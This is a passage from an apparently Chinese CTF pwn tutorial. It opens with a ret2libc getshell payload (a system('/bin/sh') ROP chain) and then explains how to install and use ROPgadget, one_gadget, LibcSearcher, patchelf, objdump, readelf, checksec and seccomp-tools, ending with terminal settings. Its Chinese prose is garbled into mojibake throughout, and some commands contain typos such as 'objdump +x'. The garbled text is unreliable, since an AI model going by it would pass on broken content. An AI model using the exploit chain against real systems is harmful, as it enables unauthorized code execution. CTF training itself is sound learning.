å…»æˆå¥½ä¹ æƒ¯ï¼Œæ‰“å°ä¸€ä¸‹libc_baseçœ‹çœ‹æ˜¯ä¸æ˜¯åä¸‰ä½ä¸º0 log.success(\u0026#39;libc_base \u0026#39; + hex(libc_base)) system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # æ„é€ payload, å‡†å¤‡getshell payload = b\u0026#34;a\u0026#34;*offset + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) #+p64(vuln) æ³¨ï¼šå…¶å®å¤§å®¶è£…ä¸€ä¸ªLibcSearcheråº“å°±å¤Ÿç”¨äº†ï¼Œåé¢å‡ ä¸ªåº“å¯ä»¥ç›´æ¥è·³è¿‡\nLibcSearcher3 ï¼ˆå¯é€‰ï¼‰\n# å®‰è£… pip3 install LibcSearcher3 # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ python3 from LibcSearcher3 import * ç›¸å…³è¯´æ˜ï¼š\nLibcSearcher3 Â· PyPI\nLibcSearcherX ï¼ˆå¯é€‰ï¼‰\nï¼ˆè¿™ä¸ªæˆ‘æ²¡è£…ï¼‰\niptL-F4ck/LibcSearcherX (github.com)\npwnmodules ï¼ˆå¯é€‰ï¼‰\nï¼ˆè¿™ä¸ªæˆ‘ä¹Ÿæ²¡è£… ğŸ¶ ï¼‰\nPwnModules Â· PyPI\nPWN ç›¸å…³å·¥å…· # ç°åœ¨ä¸çŸ¥é“æ€ä¹ˆç”¨ã€ä»€ä¹ˆæ—¶å€™ç”¨å¾ˆæ­£å¸¸ï¼Œå¯ä»¥å…ˆè£…å¥½ï¼Œåæ­£ä»¥åè¿Ÿæ—©ä¼šç”¨åˆ°çš„[doge]\nå½“ç„¶ä¹Ÿå¯ä»¥å…ˆæ ‡è®°ä¸€ä¸‹ç­‰åˆ°æ—¶å€™æœ‰éœ€è¦å†å›æ¥çœ‹ã€‚\nROPgadget # è¯¥å·¥å…·å…è®¸åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æœç´¢å°å·¥å…·ï¼Œä»¥ä¿ƒè¿›å¯¹ROPçš„åˆ©ç”¨ã€‚ROPgadgetæ”¯æŒx86ã€x64ã€ARMã€ARM64ã€PowerPCã€SPARCå’ŒMIPSæ¶æ„ä¸‹çš„ELF/PE/Mach-Oæ ¼å¼\nå®ŒæˆåŸºæœ¬ROPé¢˜å‹æ—¶æ–¹ä¾¿æˆ‘ä»¬æ„é€ ROPé“¾\n# å®‰è£… sudo pip3 install capstone git clone https://github.com/JonathanSalwan/ROPgadget.git cd ROPgadget sudo python3 setup.py install # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ ROPgadget -V å¦‚æœæŠ¥é”™äº†ï¼Œå¯ä»¥æŒ‰ä¸‹é¢çš„æ–¹æ³•è§£å†³ï¼š\n# æŠ¥é”™è¯¦æƒ…ï¼š ...Error: Script \u0026#39;scripts/ROPgadget\u0026#39; not found in metadata at \u0026#39;/home/ta0lve/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info\u0026#39; # å¤åˆ¶è¿™ä¸ªæŠ¥é”™çš„è·¯å¾„ # è§£å†³ï¼š cd ROPgadget # è¿›å…¥ä½ ä»¬gitçš„ç›®å½•é‡Œï¼Œå·²ç»è¿›å»äº†å°±ä¸ç”¨è¾“è¿™ä¸ªå‘½ä»¤äº† sudo cp -r scripts ä½ å¤åˆ¶çš„è·¯å¾„ # ç¤ºä¾‹ï¼š sudo cp -r scripts /home/ta0lve/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info åŸºç¡€ç”¨æ³•ï¼š\n# å…¶ä¸­çš„pwnæ˜¯æˆ‘ä»¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ ROPgadget --binary pwn --only \u0026#34;pop|ret\u0026#34; | grep rax ROPgadget --binary pwn --only â€œintâ€ ROPgadget --binary pwn --string \u0026#34;/bin/sh\u0026#34; # è¾¨æï¼š ROPgadget --binary pwn | grep ret # å«æœ‰retæŒ‡ä»¤çš„éƒ½ç¬¦åˆ ROPgadget --binary pwn --only \u0026#34;ret\u0026#34; # åªå«æœ‰retæŒ‡ä»¤çš„ one_gadget # åœ¨ctf-pwnä¸­å¤§éƒ¨åˆ†æƒ…å†µéœ€è¦è·å¾—è¿œç¨‹shellï¼Œone_gadgetä¼šè‡ªåŠ¨æŸ¥æ‰¾ELFæ–‡ä»¶ä¸­çš„execve(â€˜/bin/shâ€™, NULL, NULL)ï¼Œé€šè¿‡exploitå®ç°RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰\næŸ¥æ‰¾å¯ä»¥ç”¨æ¥ getshell çš„æŒ‡ä»¤\n# å®‰è£… sudo apt install -y ruby ruby-dev sudo gem install one_gadget # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ one_gadget --version åŸºç¡€ç”¨æ³•ï¼š\none_gadget libc.so.6 \u0026#34;\u0026#34;\u0026#34; è¾“å‡ºï¼š 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL \u0026#34;\u0026#34;\u0026#34; glibc-all-in_one # glibc-all-in-one æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œé‡Œé¢æœ‰å„ç§ç‰ˆæœ¬çš„glibc æºç ã€‚\n## gitå®‰è£… git clone https://github.com/matrix1001/glibc-all-in-one cd glibc-all-in-one sudo python3 update_list ## ä½¿ç”¨ # è·å–å¯ä»¥æ›´æ–°çš„glibcçš„ç‰ˆæœ¬ ./update_list # æŸ¥çœ‹å¯ä¸‹è½½çš„glibc cat list # glibcä¸ºè¦ä¸‹è½½glibcçš„åå­— #ï¼ˆé¢˜ç›®åº”è¯¥ä¼šæœ‰æç¤ºï¼Œæˆ–è€…idaé‡Œé¢ä¹Ÿæœ‰ç›¸å…³ä¿¡æ¯ï¼‰ sudo ./download glibc ## ç¤ºä¾‹ï¼š sudo ./download 2.23-0ubuntu11.3_amd64 ## å…³äº old_listæ–‡ä»¶ï¼š # old_listä¸­çš„æ˜¯è¿‡æ—¶çš„glibcæ–‡ä»¶ï¼Œä¸€èˆ¬ä¸ä¼šç”¨åˆ°ï¼Œ # å¦‚æœéœ€è¦ä¸‹è½½old_listé‡Œé¢å¯¹åº”çš„glibcï¼Œ # è¦ç”¨./download_oldè¿›è¡Œä¸‹è½½æ“ä½œã€‚ï¼ˆç”¨./downloadä¼šæŠ¥é”™ï¼‰ ä¸‹è½½å¥½ä¹‹åç›®å½•é‡Œld.soæ–‡ä»¶æ˜¯é“¾æ¥å™¨ï¼Œlibc.soæ–‡ä»¶æ˜¯glibcæ–‡ä»¶\npatchelf # ç”¨äºä¿®æ”¹ç°æœ‰ELFå¯æ‰§è¡Œæ–‡ä»¶å’Œåº“çš„ç®€å•å®ç”¨ç¨‹åº\néå¸¸å®ç”¨çš„ä¸€ä¸ªå·¥å…·ï¼\n# å®‰è£… sudo apt install patchelf # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ patchelf --version åŸºç¡€ç”¨æ³•ï¼š\n## å…¶ä¸­çš„pwnæ˜¯æˆ‘ä»¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ # æ›´æ¢é“¾æ¥å™¨ ld.so æ–‡ä»¶ patchelf --set-interpreter ldçš„ç¡¬è·¯å¾„ ./pwn # ç›´æ¥é€‰æ‹© glibc libc.so æ–‡ä»¶ patchelf --replace-needed libc.so.6 ä½ è¦æ¢çš„libcçš„ç¡¬è·¯å¾„ ./pwn # æ›´æ¢glibcæœç´¢è·¯å¾„ï¼š patchelf --set-rpath glibc-all-in-oneä¸‹è½½çš„æ–‡ä»¶å¤¹ ./pwn # æŸ¥çœ‹elfçš„ldå’Œlibc ldd ./pwn ## ç¤ºä¾‹ï¼š patchelf --set-interpreter ~/my_tools/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./pwn patchelf --replace-needed libc.so.6 ./libc-2.23.so ./pwn patchelf --set-rpath ~/my_tools/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 ./pwn # æ£€æŸ¥ï¼š ldd ./pwn å¦‚æœè§‰å¾—å¤ªéº»çƒ¦äº†ï¼Œå…¶å®ä¹Ÿå¯ä»¥ç›´æ¥åœ¨expé‡Œé¢æŒ‡å®šï¼š\n# åˆ©ç”¨pwntoolsåŠ è½½ä¸åŒç‰ˆæœ¬libcè°ƒè¯•ç¨‹åº # è¿™ä¸ªæ–¹æ³•æœ€å¥½å°†é“¾æ¥å™¨ld.soå’Œé¢˜ç›®ç»™æˆ‘ä»¬çš„libc.soå¤åˆ¶åˆ°å½“å‰ç›®å½•ä¸‹ taolve = process([\u0026#34;ld.so\u0026#34;, \u0026#34;./pwn\u0026#34;], env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;libc.so.6\u0026#34;}) # ç¤ºä¾‹ï¼š(è¿™æ˜¯æˆ‘å¸¸ç”¨çš„è„šæœ¬å¼€å¤´éƒ¨åˆ†) from pwn import * from LibcSearcher3 import * is_debug = 1 is_remote = 0 # is_remote == 2æ—¶å¯ä»¥åˆ©ç”¨pwntoolsåŠ è½½ä¸åŒç‰ˆæœ¬libcè°ƒè¯•ç¨‹åº is_gdb = 0 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;ip\u0026#34;, post) elif is_remote == 2: taolve = process([\u0026#34;./ld-2.23.so\u0026#34;, \u0026#39;./pwn\u0026#39;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc-2.23.so\u0026#34;}) else: taolve = process(\u0026#39;./pwn\u0026#39;) def _gdb(my_gdb): if my_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) _gdb(is_gdb) æ¨èé˜…è¯»ï¼š\nCTF pwnä¸­åˆ©ç”¨pwntoolsåŠ è½½ä¸åŒç‰ˆæœ¬libcè°ƒè¯•ç¨‹åºçš„æ–¹æ³•\npwnç›¸å…³å‘½ä»¤è¡¥å……ï¼š # ï¼ˆè¿™äº›å‘½ä»¤éƒ½æ˜¯linuxè‡ªå¸¦çš„ï¼Œåªæ˜¯è¿‡ä¸€ä¸‹ä¸€äº›æ¯”è¾ƒå¸¸ç”¨çš„å‘½ä»¤ï¼‰\nstringsçš„ä½¿ç”¨\n# æœç´¢å­—ç¬¦ä¸² strings pwn \u0026#34;ctf\u0026#34; # æŸ¥çœ‹ä¸€ä¸ªlibcçš„ç‰ˆæœ¬(çœ‹ä½¿ç”¨ä»€ä¹ˆç‰ˆæœ¬çš„è¿æ¥å™¨) strings libc.so.6 |grep GLIBC \u0026#34;\u0026#34;\u0026#34; è¾“å‡ºï¼š GLIBC_2.2.5 GLIBC_2.2.6 ... GLIBC_2.23 GLIBC_PRIVATE GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al. \u0026#34;\u0026#34;\u0026#34; # æ‰€ä»¥è¿™ä¸ª libc.so æ–‡ä»¶æ˜¯2.23ç‰ˆæœ¬çš„ # ä½¿ç”¨ 2.23-0ubuntu11.3 çš„é“¾æ¥å™¨ # ~/my_tools/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so objdump çš„ä½¿ç”¨\nobjdumpå‘½ä»¤ï¼Œä¸€èˆ¬ç”¨äºæ˜¾ç¤ºäºŒè¿›åˆ¶æ–‡ä»¶çš„ä¿¡æ¯\n# å…¶ä¸­çš„pwnæ˜¯æˆ‘ä»¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ # ç¤ºä¾‹å›¾å°±ä¸æ”¾äº†ï¼Œå¸ˆå‚…ä»¬å¯ä»¥ç›´æ¥åœ¨è‡ªå·±çš„linuxé‡Œæ‰§è¡Œä¸€ä¸‹çœ‹çœ‹ # æ•´ä½“ä¿¡æ¯ objdump -f pwn # æ‰€æœ‰æ®µ objdump -p pwn # æ‰€æœ‰èŠ‚ objdump -h pwn # æ‰€æœ‰æ®µ + æ‰€æœ‰èŠ‚ + æ‰€æœ‰ç¬¦å· objdump +x pwn # å¯æ‰§è¡Œéƒ¨åˆ†å¹¶åæ±‡ç¼– objdump -d pwn # æ‰€æœ‰èŠ‚åæ±‡ç¼– objdump -D pwn # æ˜¾ç¤ºæ‰€æœ‰èŠ‚çš„ 16 è¿›åˆ¶å†…å®¹ï¼ˆå¯çœ‹ got è¡¨ï¼‰ objdump -s pwn # ç¬¦å·è¡¨ objdump -t pwn # åŠ¨æ€ç¬¦å·è¡¨ objdump -T pwn # é‡å®šä½ä¿¡æ¯ objdump -R pwn # ä»…åæ±‡ç¼–æŒ‡å®šçš„sectionã€‚å¯ä»¥æœ‰å¤šä¸ª-jå‚æ•°æ¥é€‰æ‹©å¤šä¸ªsection -j section # æŒ‡å®šèŠ‚çš„å†…å®¹ objdump -s -j .got pwn ä»¥ä¸‹æ˜¯æˆ‘ä¸ªäººæ¯”è¾ƒå¸¸ç”¨çš„ï¼Œæ¬¢è¿å¸ˆå‚…ä»¬è¡¥å……ï¼š\n# æŸ¥çœ‹pltç¬¦å·è¡¨çš„è°ƒç”¨åœ°å€ objdump -d pwn | grep \u0026#34;plt\u0026#34; objdump -R pwn objdump -s -j .got pwn å…³äºobjdumpçš„å…¶ä»–åæ±‡ç¼–å‘½ä»¤çš„ä½¿ç”¨ï¼Œå¯é˜…è¯»ï¼š\nobjdumpåæ±‡ç¼–å‘½ä»¤ä½¿ç”¨æŒ‡å—\nreadelf çš„ä½¿ç”¨\nreadelfå‘½ä»¤ï¼Œä¸€èˆ¬ç”¨äºæŸ¥çœ‹ELFæ ¼å¼çš„æ–‡ä»¶ä¿¡æ¯\n# ç¤ºä¾‹ï¼š readelf pwn -h -a , --all æ˜¾ç¤ºå…¨éƒ¨ä¿¡æ¯,ç­‰ä»·äº -h -l -S -s -r -d -V -A -I ã€‚ -h , --file-header æ˜¾ç¤º elf æ–‡ä»¶å¼€å§‹çš„æ–‡ä»¶å¤´ä¿¡æ¯. -l , --program-headers , --segments æ˜¾ç¤ºç¨‹åºå¤´ï¼ˆæ®µå¤´ï¼‰ä¿¡æ¯(å¦‚æœæœ‰çš„è¯)ã€‚ -S , --section-headers , --sections æ˜¾ç¤ºèŠ‚å¤´ä¿¡æ¯(å¦‚æœæœ‰çš„è¯)ã€‚ -g , --section-groups æ˜¾ç¤ºèŠ‚ç»„ä¿¡æ¯(å¦‚æœæœ‰çš„è¯)ã€‚ -t , --section-details æ˜¾ç¤ºèŠ‚çš„è¯¦ç»†ä¿¡æ¯( -S çš„)ã€‚ -s , --syms , --symbols æ˜¾ç¤ºç¬¦å·è¡¨æ®µä¸­çš„é¡¹ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚ -e , --headers æ˜¾ç¤ºå…¨éƒ¨å¤´ä¿¡æ¯ï¼Œç­‰ä»·äº: -h -l -S -n , --notes æ˜¾ç¤º note æ®µï¼ˆå†…æ ¸æ³¨é‡Šï¼‰çš„ä¿¡æ¯ã€‚ -r , --relocs æ˜¾ç¤ºå¯é‡å®šä½æ®µçš„ä¿¡æ¯ã€‚ -u , --unwind æ˜¾ç¤º unwind æ®µä¿¡æ¯ã€‚å½“å‰åªæ”¯æŒ IA64 ELF çš„ unwind æ®µä¿¡æ¯ã€‚ -d , --dynamic æ˜¾ç¤ºåŠ¨æ€æ®µçš„ä¿¡æ¯ã€‚ -V , --version-info æ˜¾ç¤ºç‰ˆæœ¬æ®µçš„ä¿¡æ¯ã€‚ -A , --arch-specific æ˜¾ç¤º CPU æ„æ¶ä¿¡æ¯ã€‚ -D , --use-dynamic ä½¿ç”¨åŠ¨æ€æ®µä¸­çš„ç¬¦å·è¡¨æ˜¾ç¤ºç¬¦å·ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ç¬¦å·æ®µã€‚ -x , --hex-dump= ä»¥16è¿›åˆ¶æ–¹å¼æ˜¾ç¤ºæŒ‡å®šæ®µå†…å†…å®¹ã€‚ number æŒ‡å®šæ®µè¡¨ä¸­æ®µçš„ç´¢å¼•,æˆ–å­—ç¬¦ä¸²æŒ‡å®šæ–‡ä»¶ä¸­çš„æ®µåã€‚ -w[liaprmfFsoR] or â€“debug-dump[=line,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=frames-interp,=str,=loc,=Ranges] æ˜¾ç¤ºè°ƒè¯•æ®µä¸­æŒ‡å®šçš„å†…å®¹ã€‚ -I , --histogram æ˜¾ç¤ºç¬¦å·çš„æ—¶å€™ï¼Œæ˜¾ç¤º bucket list é•¿åº¦çš„æŸ±çŠ¶å›¾ã€‚ -v , --version æ˜¾ç¤º readelf çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚ -H , --help æ˜¾ç¤º readelf æ‰€æ”¯æŒçš„å‘½ä»¤è¡Œé€‰é¡¹ã€‚ -W , --wide å®½è¡Œè¾“å‡ºã€‚ å‚è€ƒï¼š Linuxå‘½ä»¤å­¦ä¹ æ‰‹å†Œ-readelf checksec\nè¿™ä¸ªå‘½ä»¤å¯ä»¥è¯†åˆ«äºŒè¿›åˆ¶æ–‡ä»¶çš„å®‰å…¨å±æ€§ ï¼Œå³æ£€æµ‹æˆ‘ä»¬çš„äºŒè¿›åˆ¶ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶çš„å¼€å…³æƒ…å†µï¼Œå¯ä»¥åœ¨Linuxä¸­å®‰è£…ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸‰ä¸ªgdbæ’ä»¶ä¸­ç›´æ¥ä½¿ç”¨ã€‚\nä¸è¿‡gdbä¸­çš„checksecç‰ˆæœ¬è¾ƒè€ï¼Œæ£€æµ‹çš„ä¿æŠ¤æœºåˆ¶ç§ç±»è¾ƒå°‘ï¼Œæ‰€ä»¥è¿˜æ˜¯å»ºè®®å¤§å®¶éƒ½å®‰è£…ä¸€ä¸ª\n# å®‰è£…ååœ¨ç»ˆç«¯å‘½ä»¤è¡Œä¸­ä½¿ç”¨ sudo apt install checksec checksec --file=pwn # åœ¨å¸¦æ’ä»¶çš„gdbä¸­ä½¿ç”¨ gdb pwn checksec seccomp-tools # seccompæ˜¯ä¸€ç§å†…æ ¸ä¸­çš„å®‰å…¨æœºåˆ¶,æ­£å¸¸æƒ…å†µä¸‹,ç¨‹åºå¯ä»¥ä½¿ç”¨æ‰€æœ‰çš„syscallï¼Œè¿™æ˜¯ä¸å®‰å…¨çš„ï¼Œæ¯”å¦‚åŠ«æŒç¨‹åºæµåé€šè¿‡execveçš„syscallæ¥getshellã€‚é€šè¿‡seccompæˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºä¸­ç¦ç”¨æ‰æŸäº›syscallï¼Œè¿™æ ·å°±ç®—åŠ«æŒäº†ç¨‹åºæµä¹Ÿåªèƒ½è°ƒç”¨éƒ¨åˆ†çš„syscalläº†\nseccomp-toolsé¡¹ç›®æ—¨åœ¨(ä½†ä¸é™äº)åˆ†æCTF pwnæŒ‘æˆ˜ä¸­çš„seccompæ²™ç›’ã€‚æœ‰äº›ç‰¹æ€§å¯èƒ½æ˜¯ç‰¹å®šäºctfçš„ï¼Œä½†å¯¹äºåˆ†æçœŸå®æƒ…å†µä¸‹çš„seccompä»ç„¶æœ‰ç”¨\nç”¨äºåˆ†ææ²™ç›’çš„å·¥å…·\n# å®‰è£… sudo gem install seccomp-tools # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ seccomp-tools --version # ä½¿ç”¨ï¼š seccomp-tools dump ./pwn # å¯ä»¥çŸ¥é“å“ªäº›syscallè¢«ç³»ç»Ÿè¢«ç¦ç”¨ main_arena_offsetï¼ˆå¯è·³ï¼‰ # ç”¨æ¥è®¡ç®— main_arena çš„åç§»å·¥å…·\n# å®‰è£… git clone https://github.com/bash-c/main_arena_offset.git cd main_arena_offset # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ ./main_arena /lib/x86_64-linux-gnu/libc.so.6 ä¹Ÿå¯ä»¥ç”¨ dev2ero åº“ä¸­å°è£…çš„ py_main_arena_offsetpy æ¨¡å—æ¥è®¡ç®—main_arenaçš„åç§»ã€‚\nfrom pymao import * libc = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; main_arena_offset = gmao(blic) main_arena_offset Crypto ç›¸å…³å·¥å…·ï¼ˆå¯è·³ï¼‰ # ç´¯äº†ï¼Œæˆ‘å…ˆæŒ–ä¸ªå‘ï¼Œä¸‹æ¬¡å†æ›´æ–° _(:Ğ·ã€âˆ )_\ngym2\nsage mathï¼ˆCryptoï¼‰\næé«˜ä½“éªŒçš„ç›¸å…³å·¥å…· # Oh-My-Zsh ï¼ˆå¯é€‰ï¼‰ # # å®‰è£…ï¼š git clone https://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc # æ›´æ”¹ä½ çš„é»˜è®¤ Shellï¼š chsh -s /bin/zsh ä½¿ç”¨å‚è€ƒï¼š\nOh-My-Zshçš„é…ç½®ä¸ä½¿ç”¨\nterminator ï¼ˆå¯é€‰ï¼‰ # ä¸€ä¸ªç»ˆç«¯è½¯ä»¶ï¼Œåªæ˜¯ç”¨æ¥ä¼˜åŒ–ä½“éªŒçš„ï¼ˆæ¯•ç«Ÿæ‰“pwnçš„è¯ä»¥åå¯èƒ½ä¼šè¾ƒä¸ºé¢‘ç¹åœ°ä½¿ç”¨ç»ˆç«¯ï¼‰ï¼Œèµ¶æ—¶é—´çš„å¸ˆå‚…å¯ä»¥è·³è¿‡~\n# å®‰è£…ï¼š sudo apt update sudo apt install terminator # è‡ªå®šä¹‰ï¼š cd ~/.config/terminator/ sudo gedit config # æ³¨æ„è¿™ä¸ªconfigæ–‡ä»¶ä»¥åŠterminatoræ–‡ä»¶å¤¹å¯èƒ½ä¸€å¼€å§‹ä¸å­˜åœ¨ï¼Œ # å¯ä»¥è‡ªå·±æ–°å»ºæ–‡ä»¶å¤¹å†åˆ›å»º.ä¸€æ ·ä¼šç”Ÿæ•ˆçš„ å¸¸ç”¨å¿«æ·é”®ï¼š\nï¼ˆæ“ä½œæ–¹é¢ï¼‰\nCtrl + Shift + C å¤åˆ¶\nCtrl + Shift + V ç²˜è´´\nCtrl + Shift + F åœ¨å½“å‰çª—å£æœç´¢\nCtrl + Shift + G æ¸…å±\nCtrl + Shift + N æˆ–è€… Ctrl + Tab åœ¨åˆ†å‰²çš„å„çª—å£ä¹‹é—´åˆ‡æ¢\nCtrl + Shift + W å…³é—­å½“å‰ç»ˆç«¯\nCtrl + Shift + Q å…³é—­æ‰€æœ‰ç»ˆç«¯ï¼ˆé€€å‡ºç¨‹åºï¼‰\nCtrl + Alt + T å¯åŠ¨ç»ˆç«¯ï¼ˆä¸å®‰è£…terminatoråˆ™æ˜¯Ubuntuè‡ªå¸¦çš„terminalï¼‰\nï¼ˆçª—å£æ–¹é¢ï¼‰\nF11 å…¨å±\nCtrl + Shift + O æ°´å¹³åˆ†å‰²ç»ˆç«¯ï¼ˆåˆ†æˆä¸Šä¸‹ä¸¤ä¸ªçª—å£ï¼‰\nCtrl + Shift + E å‚ç›´åˆ†å‰²ç»ˆç«¯ï¼ˆåˆ†æˆå·¦å³ä¸¤ä¸ªçª—å£ï¼‰\nCtrl + Shift + Right/Left åœ¨å‚ç›´åˆ†å‰²çš„ç»ˆç«¯ä¸­å°†åˆ†å‰²æ¡å‘å³/å·¦ç§»åŠ¨\nCtrl + Shift + X æ”¾å¤§ï¼ˆè¿˜åŸï¼‰å½“å‰ç»ˆç«¯ï¼ˆå°†åˆ†å‰²çš„æŸä¸€ä¸ªçª—å£æ”¾å¤§è‡³å…¨å±ä½¿ç”¨ï¼‰\nCtrl + Shift + S éšè—/æ˜¾ç¤ºæ»šåŠ¨æ¡\nCtrl + Shift + Z ä»æ”¾å¤§è‡³å…¨å±çš„æŸä¸€çª—å£å›åˆ°å¤šçª—æ ¼ç•Œé¢\nï¼ˆå…¶ä»–å¿«æ·é”®ï¼‰\nSearch for a Keyword â€“ Ctrl+Shift+fï¼ˆå¥½ç”¨çš„æœç´¢åŠŸèƒ½ï¼‰\nMove to Next Terminal â€“ Ctrl+Shift+N or Ctrl+Tab\nMove Parent Dragbar Right â€“ Ctrl+Shift+Right_Arrow_key\nMove Parent Dragbar Left â€“ Ctrl+Shift+Left_Arrow_key\nMove Parent Dragbar Up â€“ Ctrl+Shift+Up_Arrow_key\nMove Parent Dragbar Down â€“ Ctrl+Shift+Down_Arrow_key\nHide/Show Scrollbar â€“ Ctrl+Shift+s\nMove to the Above Terminal â€“ Alt+Up_Arrow_Key\nMove to the Below Terminal â€“ Alt+Down_Arrow_Key\nMove to the Left Terminal â€“ Alt+Left_Arrow_Key\nMove to the Right Terminal â€“ Alt+Right_Arrow_Key\nCopy a text to clipboard â€“ Ctrl+Shift+c\nPaste a text from Clipboard â€“ Ctrl+Shift+v\nClose the Current Terminal â€“ Ctrl+Shift+w\nQuit the Terminator â€“ Ctrl+Shift+q\nToggle Between Terminalsï¼ˆåˆ‡æ¢ç»ˆç«¯ï¼‰ â€“ Ctrl+Shift+x\nOpen New Tab â€“ Ctrl+Shift+t\nMove to Next Tab â€“ Ctrl+page_Down\nMove to Previous Tab â€“ Ctrl+Page_up\nIncrease Font size â€“ Ctrl+(+)\nDecrease Font Size â€“ Ctrl+(-)\nReset Font Size to Original â€“ Ctrl+0\nToggle Full Screen Mode â€“ F11\nReset Terminal â€“ Ctrl+Shift+R\nReset Terminal and Clear Window â€“ Ctrl+Shift+G\nRemove all the terminal grouping â€“ Super+Shift+t\nGroup all Terminal into one â€“ Super+g\nconfig æ–‡ä»¶å†…å®¹å¯ä»¥ç…§æ¬ï¼š\nï¼ˆæˆ‘ä»¬è¿˜å¯ä»¥é¡ºä¾¿æŠŠæ¡Œé¢èƒŒæ™¯ç»™æ¢äº†ï¼Œè¿™æ ·ç»ˆç«¯è®¾ç½®ä¸ºé€æ˜çš„å°±æœ‰ä¸€ä¸ªèƒŒæ™¯äº†ï¼‰\n# ç¤ºä¾‹1ï¼š(å¦‚æœç›´æ¥å¤åˆ¶ç²˜è´´ä¸è¡Œå°±æŠŠæ³¨é‡Šåˆ æ‰) [global_config] handle_size = -3 title_transmit_fg_color = \u0026#34;#000000\u0026#34; title_transmit_bg_color = \u0026#34;#3e3838\u0026#34; inactive_color_offset = 1.0 enabled_plugins = CustomCommandsMenu, LaunchpadCodeURLHandler, APTURLHandler, LaunchpadBugURLHandler suppress_multiple_term_dialog = True [keybindings] [profiles] [[default]] background_color = \u0026#34;#373737\u0026#34; background_darkness = 0.8 background_type = transparent cursor_shape = ibeam cursor_color = \u0026#34;#e8e8e8\u0026#34; font = Ubuntu Mono 14 foreground_color = \u0026#34;#e8e8e8\u0026#34; copy_on_selection = True # é€‰æ‹©æ–‡æœ¬æ—¶åŒæ—¶å°†æ•°æ®æ‹·è´åˆ°å‰ªåˆ‡æ¿ä¸­,å¼ºçƒˆæ¨è show_titlebar = False scroll_background = False scrollback_lines = 3000 palette = \u0026#34;#292424:#5a8e1c:#00ff00:#cdcd00:#1e90ff:#cd00cd:#00cdcd:#d6d9d4:#4c4c4c:#868e09:#00ff00:#ffff00:#4682b4:#ff00ff:#00ffff:#ffffff\u0026#34; use_system_font = False [layouts] [[default]] [[[child1]]] parent = window0 profile = default type = Terminal [[[window0]]] parent = \u0026#34;\u0026#34; size = 925, 570 type = Window [plugins] # ç¤ºä¾‹2ï¼š(å¦‚æœç›´æ¥å¤åˆ¶ç²˜è´´ä¸è¡Œå°±æŠŠæ³¨é‡Šåˆ æ‰) [global_config] title_transmit_bg_color = \u0026#34;#d30102\u0026#34; focus = system suppress_multiple_term_dialog = True [keybindings] [profiles] [[default]] palette = \u0026#34;#2d2d2d:#f2777a:#99cc99:#ffcc66:#6699cc:#cc99cc:#66cccc:#d3d0c8:#747369:#f2777a:#99cc99:#ffcc66:#6699cc:#cc99cc:#66cccc:#f2f0ec\u0026#34; background_color = \u0026#34;#2D2D2D\u0026#34; # èƒŒæ™¯é¢œè‰² background_image = None background_darkness = 0.85 cursor_color = \u0026#34;#2D2D2D\u0026#34; # å…‰æ ‡é¢œè‰² cursor_blink = True # å…‰æ ‡æ˜¯å¦é—ªçƒ foreground_color = \u0026#34;#EEE9E9\u0026#34; # æ–‡å­—çš„é¢œè‰² use_system_font = False # æ˜¯å¦å¯ç”¨ç³»ç»Ÿå­—ä½“ font = Ubuntu Mono 13 # å­—ä½“è®¾ç½®ï¼Œåé¢çš„æ•°å­—è¡¨ç¤ºå­—ä½“å¤§å° copy_on_selection = True # 